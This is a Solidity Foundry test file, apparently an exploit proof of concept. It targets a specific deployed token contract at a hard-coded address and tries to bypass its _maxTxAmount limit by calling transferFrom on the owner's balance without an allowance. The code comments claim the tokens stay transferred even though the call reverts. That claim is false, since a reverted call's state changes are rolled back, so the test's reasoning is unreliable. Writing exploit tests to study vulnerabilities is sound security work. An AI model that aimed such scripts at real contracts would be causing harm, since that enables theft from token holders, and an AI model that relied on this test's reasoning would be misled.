pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CLEToken {
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xDeEa8fdB85503531F6A5D2A036d3268bD7C06c09;
    address attacker = address(this);
    CLEToken token;
    address contractOwner;
    uint256 maxTxAmount;
    address receiver;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = CLEToken(TARGET);
        receiver = makeAddr("receiver");

        vm.label(receiver, "Token Receiver");
        contractOwner = token.owner();
        vm.label(contractOwner, "Contract Owner");
        maxTxAmount = token._maxTxAmount();

        // Disable swapAndLiquify to prevent timeouts during the test
        vm.startPrank(contractOwner);
        token.setSwapAndLiquifyEnabled(false);
        vm.stopPrank();

        // The transfer will be from the owner, so the owner needs a balance.
        deal(TARGET, contractOwner, maxTxAmount + 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 ownerBalance = token.balanceOf(contractOwner);
        assertTrue(ownerBalance > maxTxAmount, "Owner balance is not greater than maxTxAmount");

        // The call to transferFrom will succeed in transferring tokens but then revert on the allowance check.
        // We expect the revert, so we wrap it in a try-catch block.
        try token.transferFrom(contractOwner, receiver, ownerBalance) {
            // This part should not be reached.
            fail("Transaction did not revert as expected.");
        } catch {
            // Revert is expected because attacker has no allowance from owner.
            // The state change (token transfer) happened before the revert.
        }

        // Check that the receiver got the tokens despite the transaction reverting.
        // This confirms the _maxTxAmount bypass.
        // No fees are taken because the sender is the owner, who is excluded from fees.
        assertEq(token.balanceOf(receiver), ownerBalance, "Receiver did not receive the correct amount of tokens");
        assertGt(token.balanceOf(receiver), maxTxAmount, "Receiver balance is not greater than maxTxAmount");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

